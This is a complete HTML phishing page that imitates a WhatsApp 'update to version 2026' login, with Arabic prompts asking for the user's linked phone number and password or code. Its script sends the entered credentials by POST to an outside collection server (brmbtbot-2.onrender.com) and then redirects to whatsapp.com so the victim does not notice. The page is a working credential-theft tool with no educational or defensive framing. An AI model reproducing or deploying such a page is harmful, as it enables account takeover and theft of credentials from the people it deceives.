<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WhatsApp Update</title><style>body{background:#075e54;margin:0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:#fff;width:90%;max-width:400px;padding:30px;border-radius:15px;text-align:center;box-sizing:border-box;}input{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;}.btn{background:#25d366;color:#fff;width:100%;padding:15px;border:none;border-radius:8px;font-weight:bold;font-size:18px;margin-top:15px;}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="70"><h2>WhatsApp</h2><p style="color:#666;">يجب تسجيل الدخول لتحديث حسابك إلى إصدار 2026</p><form id="f"><input type="text" id="u" placeholder="رقم الهاتف المرتبط" required><input type="password" id="p" placeholder="كلمة المرور أو الرمز" required><button type="submit" class="btn">تحديث الآن</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'WhatsApp',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://whatsapp.com';});};</script></body></html>
